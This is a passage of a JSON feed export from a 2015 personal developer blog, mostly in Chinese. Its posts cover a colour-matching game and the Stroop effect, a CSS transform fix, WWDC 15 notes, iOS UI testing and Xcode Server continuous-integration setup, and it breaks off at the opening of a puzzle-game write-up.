Co!orMix 和 Stroop Effect 之间还确实有一种独特的联系啊！这是当然，要不然我岂不是花费了 600 多字浪费在了和主题完全没有关系的东西上了？这要是篇高考作文，十有八九会出现在下一版的高考零分作文上了。\n\n好了，言归正传，关于 Stroop Effect 还有一些事也许你会有兴趣知道：Stroop Effect 现在被广泛的应用在 Stroop Test 上，这是一种广受欢迎的神经心理学测试，测试的主要目标是调查被试人员的心理容量（Psychological Capacities）；如果被试人员有一定程度的脑损伤、痴呆或者患有神经衰退性疾病、注意缺陷多动障碍和一些精神障碍，往往会在测试中呈现一个更高的注意力干扰率。\n\n不过，不用担心，Co!orMix 只是一个用来放松的小游戏，并不像临床测试一样有各种非常严密的设定，所以得分高的未必就是比较聪明，而得分低的也不见得就有什么问题，也许别人正好一连二三十个背景颜色选项呢。所以千万不要因为完不到三位数的得分而气疯的摔手机这样，毕竟 iPhone 怎么说值个肾啊，手机虽然是消耗品也经不起那么折腾的。\n\n最后，如果你读到这里觉得：wow，你们好厉害，居然可以通过这样一个心理学现象就设计出一个游戏！我很真诚的说，谢谢您的赞美但是您想多了那么一点。其实，最初我们只是觉得这个游戏的形式简单而且还挺有趣的，所以就决定开工了，这个 Stroop Effect 只是因为我觉得这种现象在心理学中一定有个比较正式的说法吧，肯定还轮不到我来发现命名这种简单的心理学现象，所以就做了一点搜索，然后果然有人在八十多年前就发现命名了（还决定挺可惜的）。很多时候，事情往往就是这样，一些平常、不起眼的事背后隐藏着一些很有趣的解释和现象（说到这里，关于 Stroop Effect 的产生的原因有不下6种理论，我们对与自己的认知处理过程的认识还有长长的路要走啊。），也许哪天你也不小心就发现了一个之前被人们忽略的现象，然后就有个以自己名字命名的 Effect 了。\n\nSounds cool, right?\n\n\n\n最后的最后，既然都读到这里，如果你还没有玩过 Co!orMix，不妨下载下来试一试吧：\n\n\n  \n    Website: http://colormix.cee.moe\n  \n  \n    Twitter: @ColorMix_Game\n  \n  \n    iTunes Store\n  \n  \n    以及二维码：\n\n  \n\n","excerpt":"\n  本文作者為 UI/UX 設計師 @albuszheng 所寫。\n\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"About Co!orMix (1) - Introduction","permalink":"http://blog.cee.moe/about-colormix-1.html","link":"http://blog.cee.moe/about-colormix-1.html","date":"2015-07-04T00:00:00-07:00","modified":"2015-08-03T05:07:11-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n\n游戏介绍\n\n你唯一需要做的就是选择正确的颜色！很简单吧？\n千万别把背景色、词语的颜色和词语的意思搞混了哦！\n\n\n\n开发细节\n\n\n  Replay 按钮的布局：第一版的设计稿放在了和 Home 按钮一样的位置，考虑到整个游戏用户点按的区域只在屏幕的下方区域，于是后来 Replay 的位置被放在了即使是单手操作也能放到的下方区域。\n  Method Swizzling：处理了很多关于打点监控事件的问题，具体可以看一下 NSHipster 上的这篇文章。\n  TestFlight：算是第一次真真切切地用上 TestFlight 这个极棒的分发测试工具。对于收集用户反馈很有效果（例如游戏的难度控制：在后面难度变大的情况下的心理变化）。不过在提交 Beta 测试的时候也需要等待 Apple 的批准。\n\n\nTodo\n\n\n  整个游戏由于是围绕着颜色展开，所以在颜色的选取上已经照顾了色盲和色弱的同学。当然，在之后的版本中也会在设置中加上这种开关选项（Grayscale），来满足这小部分人群的需求。\n  对于游戏模式的开发和迭代。\n  对于  Watch 的适配~（现在整个 App 是完美适配 iPhone/iPad 下的横竖屏模式的哦！）\n  Android 版本：快结束了，应该过两天能和大家见面(&lt;ゝω·)☆\n\n\n开发人员\n\n\n\n整个开发一共就只有三位大三同学：我，@albuszheng，还有某不上 v2ex 的 iOS 大牛舍友。经过晚上一小时的头脑风暴 + 一天的原型交互和 Demo + 一天的完善 + 一天的测试调整，最后在周六的晚上就提前提交了整个 App。这一次的开发也可谓是最开心最愉快进度最快的一次！代码托管在 GitHub 上，任务分配使用 Issue，文档写在了 GitHub Wiki 上，也方便存档。\n\n\n\n最后，也希望大家能够捧个场，多多下载吧：\n\n\n  \n    Website: http://colormix.cee.moe\n  \n  \n    Twitter: @ColorMix_Game\n  \n  \n    戳我进入 iTunes 下载\n  \n  \n    二维码下载：\n\n    \n  \n\n\n","excerpt":"\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Why CSS transform doesn't work on inline elements","permalink":"http://blog.cee.moe/why-css-transform-doesnt-work-on-inline-elements.html","link":"http://blog.cee.moe/why-css-transform-doesnt-work-on-inline-elements.html","date":"2015-06-30T00:00:00-07:00","modified":"2015-08-03T05:06:38-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"CSS TRANSFORM DOESN’T WORK! WHY?\n\n// index.html\n&lt;footer&gt;\n\t&lt;p&gt;&lt;a href=\"blablabla\"&gt;\n    \t&lt;i class=\"fa fa-twitter fa-2x\"&gt;&lt;/i&gt;\n    &lt;/a&gt;&lt;/p&gt;\n&lt;/footer&gt;\n\n// main.css\ni:hover {\n\tcolor: #468ae9;\n\t-webkit-transform: rotate(360deg);\t/* Safari &amp; Chrome */\n    -o-transform: rotate(360deg);\t/* Opera */\n    -moz-transform: rotate(360deg); /* Firefox 4 */\n    transform: rotate(360deg);\n}\n\n\n\n\n\nTransformable element\n\nA transformable element is an element in one of these categories:\n\n\n  an element whose layout is governed by the CSS box model which is either a block-level or atomic inline-level element, or whose display property computes to table-row, table-row-group, table-header-group, table-footer-group, table-cell, or table-caption [CSS21]\n  an element in the SVG namespace and not governed by the CSS box model which has the attributes transform, ‘patternTransform‘ or gradientTransform [SVG11].\n\n\nRef：http://dev.w3.org/csswg/css-transforms-1/\n\n\n\nFix it:\n\n// index.html\n&lt;footer&gt;\n\t&lt;p class=\"animation\"&gt;&lt;a href=\"blablabla\"&gt;\n    \t&lt;i class=\"fa fa-twitter fa-2x\"&gt;&lt;/i&gt;\n    &lt;/a&gt;&lt;/p&gt;\n&lt;/footer&gt;\n\n// main.css\np.animation:hover {\n\tcolor: #468ae9;\n\t-webkit-transform: rotate(360deg);\t/* Safari &amp; Chrome */\n    -o-transform: rotate(360deg);\t/* Opera */\n    -moz-transform: rotate(360deg); /* Firefox 4 */\n    transform: rotate(360deg);\n}\n\n\n","excerpt":"CSS TRANSFORM DOESN’T WORK! WHY?\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"WWDC 15 Session 106 学习笔记","permalink":"http://blog.cee.moe/wwdc-15-session-106-learning-notes.html","link":"http://blog.cee.moe/wwdc-15-session-106-learning-notes.html","date":"2015-06-13T00:00:00-07:00","modified":"2016-01-28T06:44:36-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n  Chris Lattner 實在是太帥了！\n\n\nSession 106 - What’s new in swift\nWhy Swift 2\n\n  Fundamentals: Refine language and tools fundamentals\n  Safety: Affordances for writing robust and safe code\n  Beauty: Enable expressive libraries and APIs\n\n\n\n  用更好的語言寫更加安全和漂亮的代碼！\n\n\nWhat’s New in Swift 2\n\n\n  Fundamentals\n  Pattern Matching\n  Availabilty Checking\n  Protocol Extensions\n  Error Handling\n\n\nFundamentals\n\n  \n    Enums\n\n      enum Animals {\n  \tcase a, b\n  }\n\n    \n  \n  \n    Associated Values in Enums\n\n      enum Either&lt;T1, T2&gt; {\n  \tcase First(T1)\n      case Second(T2)\n  }\n\n    \n  \n  \n    Recursion Enums\n\n      enum Tree&lt;T&gt; {\n  \tcase Leat(T)\n  \tindirect case Node(Tree, Tree)\n  }\n\n    \n  \n  \n    do Statement\n\n      do {\n  \tlet a = Animals.Troll\n  \t...\n  }\n  // loop\n  repeat {\n      ...\n  }\n\n    \n  \n  \n    Option Sets\n\n      [option1, option2]\n\n    \n\n    \n      \n        Defining an Option: Using Protocol-Oriented Programming\n\n          struct MyFontSyle : SetOptionSetType\n\n        \n      \n    \n  \n  \n    Functions and Methods\n\n    \n      Consistent Argument Labels\n      Duplicate first name\n      Underscore to disable name labels\n      # argument syntax\n    \n  \n  Diagnostics\n  \n    SDK Improvements\n\n    \n      Nullability qualifiers\n      Objective-C typed Collections\n    \n  \n  \n    Testing\n\n      @testable\n  import MyApp\n\n    \n  \n  Rich Comments\n  A Lot More!\n\n\nPattern Matching\n\n  if-let Statment\n    \n      Compound Conditions\n      \n        Early Exits: guard Statement\n\n            guard let name = json[\"name\"] as? String else {\n        return .Second(\"missing name\")\n    }\n    // Compound Condidtions\n    guard let name = json[\"name\"] as? String,\n          let year = json[\"year\"] as? Int else {\n        return .Second(\"bad input\")\n    }\n\n        \n      \n    \n  \n  \n    Switch\n\n      if case .MyEnumCase(let value) = bar() where value != 42 {\n  \tdoSomething(value)\n  }\n\n    \n  \n  \n    for ... in Filtering\n\n      for value in mySequence where value != \"\" {\n  \tdoSomething(value)\n  }\n\n    \n  \n\n\nAvailabilty Checking\n\n  New APIs\n    \n      springLoaded\n      old: respondsToSeletor Method\n      new: get a diagnostic\n      \n        Example:\n\n          if #available(OSX 10.10.3, *) {\n  \t...\n  }\n\n        \n      \n    \n  \n\n\nProtocol Extensions\n\n  Extensions\n    \n      \n        Old\n\n          extension Array {\n      func countIf(match: Element -&gt; Bool) -&gt; Int {\n          var n = 0;\n          for value in self {\n              if match(value) {\n                  n++;\n              }\n          }\n          return n\n      }\n  }   + Global Functions\n\n        \n      \n      \n        New\n\n          extension CollectionType\n\n        \n      \n    \n  \n  \n    Method\n\n      .map().filter()\n\n    \n  \n\n\nError Handling\n\n  Kinds\n    \n      Trivial Errors\n      Logic Errors\n      Detailed, recoverable Errors\n    \n  \n  Example\n    \n      try Keyword\n      throws Keyword\n      \n        do-catch Block\n\n          do {\n      ...\n  } catch let error {\n  \t...\n  } catch {\n  \tfatalError()\n  }\n\n        \n      \n      try! Keyword\n    \n  \n  \n    Enums as Error Types\n\n      enum DataError : ErrorType {\n  \tcase MissingName\n      case MissingFile\n  }\n\n    \n  \n  \n    Defer Actions\n\n      defer { delegate?.didEndProcessing() }\n\n    \n  \n\n","excerpt":"\n  Chris Lattner 實在是太帥了！\n\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"WWDC 15 Session 107 学习笔记","permalink":"http://blog.cee.moe/wwdc-15-session-107-learning-notes.html","link":"http://blog.cee.moe/wwdc-15-session-107-learning-notes.html","date":"2015-06-12T00:00:00-07:00","modified":"2016-01-28T06:44:49-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Session 107 - What’s New in Cocoa Touch\n\nLooking Back\n在 iOS 9 誕生之前，其實蘋果就已經做了很多基礎建設性的鋪墊了：\n\n\n  iOS 6：引入了 AutoLayout\n  iOS 7：Dynamic Type，系统可以设置 app 内的字体大小\n  iOS 8：Adaptivity，可以在 Xcode 下看到不同的 Size Classes，以及对于不同的 iPhone/iPad 设备适配的 View Controllers 还有 Action Sheets\n\n\nNow in iOS 9\n于是来到了 iOS 9 的时代，新增了两个特性：Multitasking（多任务） 和 Picture-in-Picture（画中画）。接下来就是具体介绍了 Cocoa Touch 下的新的特性。\n\n\n  \n    AutoLayout：\n\n    \n      新增 UILayoutGuide 類來實現過去需要使用不可見的 Dummy View 來作為補充對齊元素的功能。例如：\n    \n\n \t\tUILayoutGuide *space1 = [[UILayoutGuide alloc] init];\n         [self.view addLayoutGuide:space1];\n     UILayoutGuide *space2 = [[UILayoutGuide alloc] init];\n     [self.view addLayoutGuide:space2];\n \n     [space1.widthAnchor constraintEqualToAnchor:space2.widthAnchor].active = YES;\n     [self.saveButton.trailingAnchor constraintEqualToAnchor:space1.leadingAnchor].active = YES;\n     [self.cancelButton.leadingAnchor constraintEqualToAnchor:space1.trailingAnchor].active = YES;\n     [self.cancelButton.trailingAnchor constraintEqualToAnchor:space2.leadingAnchor].active = YES;\n     [self.clearButton.leadingAnchor constraintEqualToAnchor:space2.trailingAnchor].active = YES;\n\n    \n  \n  \n    UIStackView\n\n    引入 UIStackView 來創建流式的佈局。\n  \n  \n    Shortcuts Bar\n\n    iPad 上輸入法預測的一行在 iOS 9 上同時提供了快捷操作。通過 UITextInputAssistantItem 來給 Shortcuts Bar 上的左右兩個圖標組（leadingBarButtonGroups 和 trailingBarButtonGroups）來添加新的按鈕。\n  \n  \n    Storyboard\n\n    多 Storyboard 支持。\n  \n  \n    Right-to-Left\n\n    對阿拉伯語等「從右向左」閱讀的語言進行了支持。對不同的 Controller、Gesture 甚至 UIImage 都可以選擇顯示的方向。在 iOS 9 下，UIView 也增加了 \nUISemanticContentAttribute 這樣一個屬性來判斷視圖是否會遵循顯示的方向規則（默認是 UISemanticContentAttributeUnspecified）。\n  \n  \n    Accessibility：吐槽一下國內的公司很少有接觸這一塊啊…\n  \n  \n    Text Editing Gestures：可以在鍵盤上利用手勢來實現對指針的移動、文本的選擇的功能。\n  \n  \n    Keyboard Commands（Cheatsheet）：連接外接鍵盤的時候長按 ⌘ 調出。\n  \n  \n    Touch Events：優化了觸控的延遲，並且使用了觸控預測（Touch Prediction）。\n  \n\n\nNew in Kits\n\n  UIKit Dynamics：\n    \n      支持了非矩形碰撞效果\n      物體關聯時的行為（UIAttachmentBehavior）\n      在不同力場下的行為（UIFieldBehavior）\n      其他的視覺效果（Visual Effects in Spotlight）\n    \n  \n  \n    API Optimizations for Swift：在 Session 106 下有詳細解釋。\n  \n  \n    Notifications：通知顯示的方式（Behavior）。\n  \n  \n    Safari：App 內可以使用 SFSafariViewController 來提供原生瀏覽器的支持。\n  \n  Extension：\n    \n      VPN Tunnel provider\n      App proxy provider\n      Filter control provider\n      Safari\n        \n          Shared links\n          Content blocking\n        \n      \n      Spotlight\n        \n          Indexing of application data\n          Index maintenance\n        \n      \n      Audio Units\n    \n\n    前面幾點感覺 SS 和 Adblock 即將走進 iOS 9 中。最後的 Audio Units 要提一下，開發者可以使用系統中不支持的視頻或者音頻播放格式了。\n  \n  \n    Contacts：新的 API，一筆帶過了。\n  \n  \n    Wallet and PassKit：為  Pay 鋪路。\n  \n  \n    Core Location：提供了單次獲得地點的 API，使用 CLLocationManager 中的 requestLocation 函數。\n  \n  \n    MapKit：提供 3D 俯視視圖，可以顯示交通情況以及指南針等功能。\n  \n  \n    HealthKit：和 watchOS 2 適配，增加了數(xing)據(sheng)類(huo)型和調用 API 接口。\n  \n  \n    ResearchKit：適配 iPad 並且提供了照片捕獲的功能。\n  \n  HomeKit：\n    \n      Detailed change notifications\n      Predefined scenes\n      Expanded trigger support\n      watchOS 2 support\n      Remote access\n    \n\n    智能家電的春天就要到了！\n  \n  \n    CloudKit：更加優惠的價格和服務，Web 端的支持。\n  \n  \n    UIDocument：Open in place。\n  \n  On Demand Resources：詳細在 Session 105 中。\n    \n      Hosted on the App Store\n      Asset Tags\n      App Slicing\n    \n  \n  \n    ReplayKit\n  \n  \n    SpriteKit\n  \n  \n    SceneKit\n  \n  \n    GamePlayKit：編寫遊戲的 AI 和規則系統。\n  \n  watchOS 2\n\n","excerpt":"Session 107 - What’s New in Cocoa Touch\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"WWDC 15 Session 104 学习笔记","permalink":"http://blog.cee.moe/wwdc-15-session-104-learning-notes.html","link":"http://blog.cee.moe/wwdc-15-session-104-learning-notes.html","date":"2015-06-11T00:00:00-07:00","modified":"2016-01-28T06:44:54-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Session 104 - What’s new in Xcode\n\n說到 Xcode，不得不說它是最漂亮的 IDE 了（巨硬不要打我，你沒有給五毛安利費）。這次的 Xcode 7.0 更新，給我們也同時帶來了很多方便和快捷的地方。下面就列舉一下學習的要點。\n\n\n  \n    Generic Collection：\n\n    Generic Collection 對自己而言並不陌生，在 Java 中其實就有實現了，不再贅述其優越性。\n\n    例如：@property (nonatomic, strong) NSArray&lt;UIImage *&gt; *imageArray;。\n  \n  \n    Size Classes：\n\n    從 Xcode 6 引入的 Size Classes 為 iOS 9 下的 Split View 奠定了基礎。\n  \n  \n    App Thinning：\n\n    使用 Bitcode 來提交整個 app，並且對於不同的型號和屏幕的 iPhone/iPad 提供不一樣的圖片支持（Slicing）。\n\n    這裡做了個 Demo 演示，具體介紹了轉移到新的 Xcode 7.0 下的應用配置更新，還有使用了 Data Set 和 On Demand Resource Tags 來下載必要的資源文件（這些文件託管在 App Store 上）。使用 startUsingGenre 和 stopUsingGenre 調用。\n  \n  \n    Debug：\n\n    更強大的 Debug 功能。提供了 Energy Report 來反映整個 app 的資源消耗問題。使用 Address Sanitizer 來追蹤 Crash 的具體位置（在 Run - Diagnostics 下打開，需要重新編譯）。通過 Test Flight 收集 Crash 信息，來追從並且定位故障。\n  \n  \n    Testing：\n\n    之前用的比較多的用來進行測試的是 XCTest 還有 Xcode Server，之前也寫過一篇文章來講如何進行自動化的 UI 測試。這次 Apple 直接給我們帶來了 UITesting 這個類，並且可以直接對模擬器進行錄製腳本后插入斷言來實現 UI 測試。這相比之前使用  Automation 測試方便了很多。\n\n    此外，還添加了 Code Coverage 功能來檢測代碼的覆蓋程度。\n  \n\n","excerpt":"Session 104 - What’s new in Xcode\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"PNJU-Workflow","permalink":"http://blog.cee.moe/PNJU-Workflow.html","link":"http://blog.cee.moe/PNJU-Workflow.html","date":"2015-06-04T00:00:00-07:00","modified":"2015-08-05T04:56:03-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"An Alfred Workflow to Login PNJU.\n\n\n  Be sure you have your Node.js / io.js installed.\n\n\nHow To Use\n\nOpen post.js file and complete the username and password.\n\nScreenshot\n\n\n\nSee Also\n\n\n  Windows\n  Mac\n  iOS &amp;  Watch\n  Android\n\n\nDependency\n\n\n  Request\n  Alfred-Item\n\n\nLicense\n\nThis application is released under GNU General Public License v2.0.\n","excerpt":"An Alfred Workflow to Login PNJU.\n\n","languages":null,"categories":["work"],"tags":[]},{"title":"39 - Thank you","permalink":"http://blog.cee.moe/39-thank-you.html","link":"http://blog.cee.moe/39-thank-you.html","date":"2015-05-31T00:00:00-07:00","modified":"2016-02-05T22:40:26-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n","excerpt":"\n","languages":null,"categories":["dance"],"tags":[]},{"title":"I ❤","permalink":"http://blog.cee.moe/i-love.html","link":"http://blog.cee.moe/i-love.html","date":"2015-04-27T00:00:00-07:00","modified":"2016-02-05T22:20:48-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n","excerpt":"\n","languages":null,"categories":["dance"],"tags":[]},{"title":"Gravity=Reality","permalink":"http://blog.cee.moe/gravity-reality.html","link":"http://blog.cee.moe/gravity-reality.html","date":"2015-04-19T00:00:00-07:00","modified":"2016-02-05T22:22:21-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n","excerpt":"\n","languages":null,"categories":["dance"],"tags":[]},{"title":"别，火花","permalink":"http://blog.cee.moe/bye-huohua.html","link":"http://blog.cee.moe/bye-huohua.html","date":"2015-04-15T00:00:00-07:00","modified":"2015-08-03T05:06:03-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"眨眼之间，近四个月就过去了。\n\n记得小学第一本日记本的名字就叫作火花。取这个名字的理由也很简单，就是想要自己的思想能像火花一样，有过绚烂绽放的那一刻。当初决定来布丁的那一刻，我就相信在这里能够展现自己的想法，能让自己的想法转化成现实。在这四个月中，的的确确有很多如火花般闪耀的亮点展现在了用户的眼前，散发着那种美妙而又香甜的氤氲。\n\n「成长」大概是这四个月来的关键词。从入职时候犯了很多错到慢慢地适应这个快节奏的团队，从一开始代码架构都不懂到逐渐了解，很多在学校里面没有学到的知识都在这里碰到并且消化了解了。\n\n撇开告别的忧伤，不如来表达自己的感谢。\n\n谢谢白老师，给了我这么一个机会。作为工作室的学长，永远是我们这些学弟学妹们的榜样和典范。对自我能力提升的意识，这一点上我会更加努力的！\n\n谢谢呵老师，四个月的悉心指导，尤其是每周的评估交流都能让自己意识到不足。代码上的问题也每次都来请教你，也学习到了很多架构和编程的技巧。\n\n谢谢 Jim，大概是批评和指责我缺点最多的人。很多职场的规矩和礼仪都是 Jim 你教给我的。还有，如饥似渴地学习、不断地挑战自己、更加关心我需要关心的事物，今后回来的时候一定会表现的更好。\n\n谢谢技术线上的各位，刁老师、龙兄、瓶子和满姐，配合虽然没有很多，但是很感谢你们的付出和奋斗。\n\n谢谢设计线上的各位，叉老师、木木和滴滴，你们绝对是最有品味的设计师了，各位真的很 Nice！（还有对不起滴滴啦~）\n\n谢谢运营线上的各位，格格、渣晨、吱吱、TD，没有你们的努力，我们的活动也不会那么地精彩。\n\n还有珊姐和星汉，背后的付出支撑着整个团队的正常的运转，真的很感谢你们！\n\n无论今后的路该怎么走，感谢大家这一路的陪伴，这份共同的梦想和感情，我将铭记在心。最后道一声「ありがとう」，谢谢你们，没有你们的四月，依然也能绽放光芒。\n\n（写于四月六日凌晨）\n","excerpt":"眨眼之间，近四个月就过去了。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"iOS 自动化 UI 测试方案","permalink":"http://blog.cee.moe/ios-ui-automating-test.html","link":"http://blog.cee.moe/ios-ui-automating-test.html","date":"2015-03-25T00:00:00-07:00","modified":"2015-08-03T05:05:53-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n  使用 Instruments 下的 Automation\n    \n      Using UIAScript，类似于 JavaScript\n      打开后选择 Add Script，编写需要测试的测试用例\n      右侧 Scripts 有需要运行的列表\n      编写完成后点击下面的 Run 即可\n      在每个 Trace Log 中都能明确展示出出现的问题\n    \n  \n  Example：对于 HomeVC 进行每个 Cell 的 UI 测试用例\n    \n      Code：略\n      Logs：\n        \n          UIALogger.logStart(testName);\n          UIALogger.logPass(testName);\n          UIALogger.logFail(testName);\n          UIATarget.localTarget().logElementTree();\n        \n      \n      Get Elements：\n        \n          App: UIATarget.localTarget().frontMostApp();\n          MainWindow：UIATarget.localTarget().frontMostApp().mainWindow();\n          .buttons();\n          .collectionViews();\n          .cells();\n          etc…\n        \n      \n      Gestures：\n        \n          .tap({x: 100, y: 200});\n          .doubleTap({x: 100, y: 200});\n          .twoFingerTap({x: 100, y: 200});\n          .dragFromToForDuration({x: 160, y: 200}, {x: 160, y: 400}, 1);\n          .scrollToElementWithPredicate();\n        \n      \n      Timing：\n        \n          .timeout();\n          .setTimeout();\n          .pushTimeout();\n          .popTimeout();\n          .delay();\n        \n      \n    \n  \n  References：\n    \n      Instruments User Guide - Using the Automation Instrument\n      Pro iOS 5 Tools: Xcode, Instruments and Build Tools\n    \n  \n\n","excerpt":"\n  使用 Instruments 下的 Automation\n    \n      Using UIAScript，类似于 JavaScript\n      打开后选择 Add Script，编写需要测试的测试用例\n      右侧 Scripts 有需要运行的列表\n      编写完成后点击下面的 Run 即可\n      在每个 Trace Log 中都能明确展示出出现的问题\n    \n  \n\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"iOS 持续集成解决方案","permalink":"http://blog.cee.moe/ios-integration.html","link":"http://blog.cee.moe/ios-integration.html","date":"2015-03-04T00:00:00-08:00","modified":"2015-08-03T05:05:46-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n  Using OS X Server &amp; Xcode Server &amp; xcsbuildd\n  Basic Steps:\n    \n      安裝 OS X Server，打開 Xcode\n      Settings 選項卡配置 Permission\n      添加 SSH Key 到 Xcode Server 上：\n        \n          Login：sudo -u _xcsbuildd /bin/bash\n          Generate SSH Key：ssh-keygen -t rsa -C \"$your_email\"\n          Show your public key：cat /var/_xcsbuildd/.ssh/id_rsa.pub\n          Put the key to github\n          SSH your server to accept the fingerprint：ssh -T git@gitlab.domain.com\n        \n      \n      配置 Workspace\n        \n          Build scheme：勾選 shared\n          添加 Server 到 Xcode 中（Preferences 裡面的 Accounts，匿名登錄）\n          添加 Bot，設置 SSH Key\n          集成日程安排：選擇一次提交更新一次\n          \n            Add Trigger：\n\n              export LC_ALL=\"en_US.UTF-8\" \n  # Put the git repo name instead of “reponame” variable\n  cd reponame\n  # Remove the following line if there is no submodules in the project\n  git submodule update --init --recursive\n  # If podfile is not in the root folder uncomment the following line\n  # and replace with the real folder name\n  # cd FolderName\n  pod install\n\n            \n          \n          報錯嘗試執行 pod setup\n        \n      \n    \n  \n  References：\n    \n      http://papaanton.com/setting-up-xcode-6-and-apple-server-4-0-for-continues-integration-with-cocoapods/\n      https://gist.github.com/mtitolo/f5283c54e300d88d9418\n      http://stackoverflow.com/questions/26990057/cocoapods-commands-fail-due-to-no-such-file-or-directory-dir-initialize-us\n      http://blog.cocoapods.org/Repairing-Our-Broken-Specs-Repository/\n    \n  \n\n\n","excerpt":"\n  Using OS X Server &amp; Xcode Server &amp; xcsbuildd\n  Basic Steps:\n    \n      安裝 OS X Server，打開 Xcode\n      Settings 選項卡配置 Permission\n      添加 SSH Key 到 Xcode Server 上：\n        \n          Login：sudo -u _xcsbuildd /bin/bash\n          Generate SSH Key：ssh-keygen -t rsa -C \"$your_email\"\n          Show your public key：cat /var/_xcsbuildd/.ssh/id_rsa.pub\n          Put the key to github\n          SSH your server to accept the fingerprint：ssh -T git@gitlab.domain.com\n        \n      \n      配置 Workspace\n        \n          Build scheme：勾選 shared\n          添加 Server 到 Xcode 中（Preferences 裡面的 Accounts，匿名登錄）\n          添加 Bot，設置 SSH Key\n          集成日程安排：選擇一次提交更新一次\n          \n            Add Trigger：\n\n              export LC_ALL=\"en_US.UTF-8\" \n  # Put the git repo name instead of “reponame” variable\n  cd reponame\n  # Remove the following line if there is no submodules in the project\n  git submodule update --init --recursive\n  # If podfile is not in the root folder uncomment the following line\n  # and replace with the real folder name\n  # cd FolderName\n  pod install\n\n            \n          \n          報錯嘗試執行 pod setup\n        \n      \n    \n  \n  References：\n    \n      http://papaanton.com/setting-up-xcode-6-and-apple-server-4-0-for-continues-integration-with-cocoapods/\n      https://gist.github.com/mtitolo/f5283c54e300d88d9418\n      http://stackoverflow.com/questions/26990057/cocoapods-commands-fail-due-to-no-such-file-or-directory-dir-initialize-us\n      http://blog.cocoapods.org/Repairing-Our-Broken-Specs-Repository/\n    \n  \n\n","languages":null,"categories":["note"],"tags":[]},{"title":"H5 開發小感","permalink":"http://blog.cee.moe/html-5-develop.html","link":"http://blog.cee.moe/html-5-develop.html","date":"2015-01-31T00:00:00-08:00","modified":"2015-08-03T05:04:47-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"最近這一個星期從 iOS 開發轉向了網頁前端（就是我很久沒有碰過的那一塊東西＋不想碰的那一塊東西）。即使有些不爽，但是這一週開發做下來給自己感覺的進步和提升還是很明顯的。下面來談談 H5 前端開發的感受。\n\n\n\n\n  \n    學會復用：\n 做語音彈幕和 233 遊戲的時候考慮了一下彈幕從右往左飄過和小球從上往下掉的邏輯基本是相同的。所以設計刷新的方法邏輯也應該基本相同，只不過維護的對象不同罷了。iOS 上基本也是一個套路，不過容易很多。\n\n \tfunction refresh() {\n     \t// move\n     // do something here...\n     // remove\n     // do something here...\n     // add\n     // do something here...\n }\n\n    \n  \n  做前思考：\n 涉及以下幾個方面。\n    \n      「設計」是很重要的一點，週四晚上在單位也是做了一個關於「工程師眼中的字體和設計」這麼一個話題的分享。\n      其次是「分層」，網頁的不同元素的疊加考慮好它們的層次結構（尤其是寫樣式表）。\n      \n        最後是「優化」。實現完成後考慮幾個問題：js 中的方法有沒有封裝好，每個調用邏輯有沒有各司其職，是否有可以優化的地方等等等等。舉一個比較簡單的例子就是 Canvas 上的 Button Listener（使用了 CreateJS）：\n\n          // ...\n  btn.addEventListener(\"click\", handleBtnClick);\n  // ...\n  function handleBtnClick() {\n  \t// Tell stage to update frame\n      // But the button doesn't know things that the stage does\n      stage.updateGameFrame();\n  }\n\n        \n      \n    \n  \n  莫慌：\n 再怎麼急也沒！有！用！尤其是當自己接觸從來沒有接觸過的東西的時候。做 233 小遊戲的時候一開始的確很茫然，在開動前問了很多前端菊苣們用什麼框架、怎麼去寫代碼等等問題，但是因為給的答案實在是太多了所以根本無法繼續。後來冷靜下來後從 Cocoas-2d、CreateJS、Kissy 等框架中選了 CreateJS 下面的 EaselJS 進行開發，再去看 API Documentation，再去編碼就輕鬆多了。\n\n\n\n\n再讓我說 H5 前端開發的話，絕對是一件很蛋疼的事情。不同的手機適配就是讓人炸掉的一件事。還有對於我這種強迫症工程師，設計稿不好的敵方都會去和設計師去交流改進，所以接觸設計師的時間也比之前做 iOS 更多了（這是件好事，因為新來了個設計師超級 Nice 的說）。與此同時還得接觸後端的內容，也算是對新領域的一種新的嘗試吧。\n","excerpt":"最近這一個星期從 iOS 開發轉向了網頁前端（就是我很久沒有碰過的那一塊東西＋不想碰的那一塊東西）。即使有些不爽，但是這一週開發做下來給自己感覺的進步和提升還是很明顯的。下面來談談 H5 前端開發的感受。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Coolshell Puzzle Game 通关记","permalink":"http://blog.cee.moe/coolshell-puzzle-game-tong-guan-ji.html","link":"http://blog.cee.moe/coolshell-puzzle-game-tong-guan-ji.html","date":"2014-12-21T00:00:00-08:00","modified":"2015-08-03T05:03:40-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"某日，看到zyq女神在群里发了个链接说：有没有人玩这个游戏啊…\n\n于是…就手贱点进去了。\n\n（本文涉及答案，如果要看解答请主动屏蔽LZ）\n\n\n\n0x00 Fuck your brain\n\n正如其名：Brainfuck。给了一段brainfuck的代码放在解释器里跑一下就得到了下一关的答案。\n\nanswer: welcome.html\n\nkeypoint:\n\n  